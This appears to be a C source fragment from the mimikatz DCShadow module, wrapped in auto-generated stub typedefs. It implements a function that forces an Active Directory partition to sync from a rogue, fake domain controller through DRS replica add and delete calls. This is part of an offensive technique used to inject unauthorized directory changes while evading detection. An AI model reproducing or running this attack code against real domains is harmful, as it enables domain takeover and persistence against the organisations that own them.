
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_16__ TYPE_6__ ;
typedef struct TYPE_15__ TYPE_5__ ;
typedef struct TYPE_14__ TYPE_4__ ;
typedef struct TYPE_13__ TYPE_3__ ;
typedef struct TYPE_12__ TYPE_2__ ;
typedef struct TYPE_11__ TYPE_1__ ;


struct TYPE_16__ {scalar_t__ pVal; int member_0; } ;
struct TYPE_11__ {scalar_t__ pszDsaSrc; int * pNC; void* ulOptions; } ;
struct TYPE_15__ {TYPE_1__ V1; int member_0; } ;
struct TYPE_12__ {void* ulOptions; scalar_t__ pszDsaSrc; int * pNC; } ;
struct TYPE_14__ {TYPE_2__ V1; int member_0; } ;
struct TYPE_13__ {int szFakeFQDN; } ;
typedef int PWSTR ;
typedef scalar_t__ PSTR ;
typedef TYPE_3__* PDCSHADOW_DOMAIN_INFO ;
typedef int NTSTATUS ;
typedef int DSNAME ;
typedef TYPE_4__ DRS_MSG_REPDEL ;
typedef TYPE_5__ DRS_MSG_REPADD ;
typedef int DRS_HANDLE ;
typedef TYPE_6__ ATTRVAL ;


 void* DRS_WRIT_REP ;
 int IDL_DRSReplicaAdd (int ,int,TYPE_5__*) ;
 int IDL_DRSReplicaDel (int ,int,TYPE_4__*) ;
 int LocalFree (scalar_t__) ;
 int MIDL_user_free (scalar_t__) ;
 int NT_SUCCESS (int ) ;
 int PRINT_ERROR (char*,int ,int ,int ) ;
 int STATUS_UNSUCCESSFUL ;
 int kprintf (char*,...) ;
 scalar_t__ kuhl_m_lsadump_dcshadow_build_replication_value_dn (TYPE_6__*,int ) ;
 scalar_t__ kull_m_string_unicode_to_ansi (int ) ;

NTSTATUS kuhl_m_lsadump_dcshadow_force_sync_partition(PDCSHADOW_DOMAIN_INFO info, DRS_HANDLE hDrs, PWSTR szPartition)
{
 NTSTATUS status = STATUS_UNSUCCESSFUL;
 ATTRVAL attrVal = {0};
 DRS_MSG_REPADD msgAdd = {0};
 DRS_MSG_REPDEL msgDel = {0};
 PSTR szANSIFakeDCFQDN = kull_m_string_unicode_to_ansi(info->szFakeFQDN);

 if(szANSIFakeDCFQDN)
 {
  if(kuhl_m_lsadump_dcshadow_build_replication_value_dn(&attrVal, szPartition))
  {
   msgAdd.V1.pNC = (DSNAME*) attrVal.pVal;
   msgAdd.V1.pszDsaSrc = szANSIFakeDCFQDN;
   msgAdd.V1.ulOptions = DRS_WRIT_REP;
   kprintf(L"Syncing %s\n", szPartition);
   status = IDL_DRSReplicaAdd(hDrs, 1, &msgAdd);
   if(!NT_SUCCESS(status))
    PRINT_ERROR(L"IDL_DRSReplicaAdd %s 0x%x (%u)\n", szPartition, status, status);
   msgDel.V1.pNC = msgAdd.V1.pNC;
   msgDel.V1.pszDsaSrc = msgAdd.V1.pszDsaSrc;
   msgDel.V1.ulOptions = DRS_WRIT_REP;
   status = IDL_DRSReplicaDel(hDrs, 1, &msgDel);
   if(!NT_SUCCESS(status))
    PRINT_ERROR(L"IDL_DRSReplicaDel %s 0x%x (%u)\n", szPartition, status, status);
   kprintf(L"Sync Done\n\n");
   LocalFree(szANSIFakeDCFQDN);
   MIDL_user_free(attrVal.pVal);
  }
 }
 return status;
}
